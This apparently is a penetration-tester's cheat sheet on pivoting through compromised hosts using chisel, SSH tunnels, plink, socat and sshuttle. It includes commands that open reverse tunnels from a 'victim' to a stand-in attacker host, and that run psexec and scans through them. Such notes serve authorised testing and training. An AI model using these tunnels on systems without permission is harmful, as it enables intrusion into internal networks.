# Pivoting & Port Forwarding

Needed when target has services only on localhost, or you compromise box A and need to reach box B that's only reachable from A.

## Chisel (most reliable, my default)

```bash
# attacker
./chisel server -p 8000 --reverse

# victim (linux)
./chisel client $ATTACKER_IP:8000 R:1080:socks
# now SOCKS proxy on attacker:1080 routes through victim

# victim (windows)
.\chisel.exe client $ATTACKER_IP:8000 R:1080:socks
```

Configure proxychains:
```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

# use it
proxychains nmap -sT -Pn $INTERNAL_IP
proxychains impacket-psexec user:pass@$INTERNAL_IP
```

## SSH tunnels

### Local port forward (you → them via your tunnel)
```bash
# expose victim's internal:8080 on your localhost:8080
ssh -L 8080:internal-host:8080 user@victim
```

### Remote port forward (them → you via their tunnel)
```bash
# expose YOUR port on victim
ssh -R 4444:localhost:4444 user@victim
```

### Dynamic (SOCKS)
```bash
ssh -D 1080 user@victim
# then proxychains
```

## Plink (Windows SSH client, no install)
```cmd
plink.exe -ssh -R 4444:127.0.0.1:4444 user@$ATTACKER
```

## socat (relay)
```bash
# on victim: forward attacker:4444 to internal:80
socat TCP-LISTEN:8080,fork TCP:internal-host:80
```

## sshuttle (transparent, no proxychains)
```bash
# needs SSH access to victim
sshuttle -r user@victim 10.10.10.0/24
# now you can hit 10.10.10.x directly
```

## When to use what

| Situation | Tool |
|---|---|
| You have shell, no SSH | chisel |
| You have SSH on victim | sshuttle (best UX) or ssh -D |
| Windows victim, no SSH | chisel |
| Need to expose your local service to victim | ssh -R or chisel R:LPORT |
| Just need one port | ssh -L |
